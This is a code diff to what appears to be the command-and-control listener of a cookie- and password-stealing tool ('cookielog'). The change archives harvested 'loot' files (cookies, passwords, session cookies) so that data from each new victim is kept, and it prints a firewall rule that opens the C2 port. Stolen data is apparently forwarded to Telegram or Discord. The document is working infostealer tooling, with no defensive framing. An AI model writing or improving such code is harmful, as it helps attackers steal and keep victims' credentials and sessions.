@@ -549,18 +549,23 @@ def start_listener(port, telegram=None, discord=None):
             log("[!] could not add the inbound firewall rule (needs an Administrator shell).")
             log("[!]   run once as admin: netsh advfirewall firewall add rule "
                 "name=\"cookielog C2 %d\" dir=in action=allow protocol=TCP localport=%d" % (port, port))
-    # clean old loot (both old and new filenames)
-    for f in ["all_cookies.json", "all_cookies.txt",
-              "passwords.json", "passwords.txt",
-              "session_cookies.json", "session_cookies.txt",
-              "cookies.json", "cookies.txt",  # legacy names
-              "listener.log"]:
-        p = os.path.join(LOOT, f)
-        if os.path.exists(p):
-            try:
-                os.remove(p)
-            except OSError:
-                pass
+    # Archive old loot (both old and new filenames). Deleting it silently threw
+    # away everything already collected -- second victim, second run, all gone.
+    old = ["all_cookies.json", "all_cookies.txt",
+           "passwords.json", "passwords.txt",
+           "session_cookies.json", "session_cookies.txt",
+           "cookies.json", "cookies.txt",  # legacy names
+           "listener.log"]
+    present = [f for f in old if os.path.exists(os.path.join(LOOT, f))]
+    if present:
+        dest = os.path.join(LOOT, "archive", time.strftime("%Y%m%d-%H%M%S"))
+        try:
+            os.makedirs(dest, exist_ok=True)
+            for f in present:
+                shutil.move(os.path.join(LOOT, f), os.path.join(dest, f))
+            log("[*] previous loot archived: %s (%d files)" % (dest, len(present)))
+        except OSError as ex:
+            log("[!] could not archive old loot: %s" % ex)
     cmd = [sys.executable, "-u", LISTEN, str(port)]
     if telegram:
         cmd += ["--telegram", telegram]
